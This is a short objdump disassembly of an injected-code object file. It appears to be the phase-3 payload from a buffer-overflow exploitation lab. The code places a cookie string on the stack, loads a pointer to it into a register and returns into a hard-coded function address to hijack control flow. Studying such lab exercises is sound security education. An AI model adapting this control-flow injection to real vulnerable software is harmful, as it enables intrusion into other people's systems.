
inj3.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <.text>:
   0:	48 81 ec 00 01 00 00 	sub    $0x100,%rsp
   7:	6a 00                	pushq  $0x0
   9:	48 b8 35 39 62 39 39 	movabs $0x6166373939623935,%rax
  10:	37 66 61 
  13:	50                   	push   %rax
  14:	48 89 e7             	mov    %rsp,%rdi
  17:	48 81 c4 10 01 00 00 	add    $0x110,%rsp
  1e:	68 fa 18 40 00       	pushq  $0x4018fa
  23:	c3                   	retq   
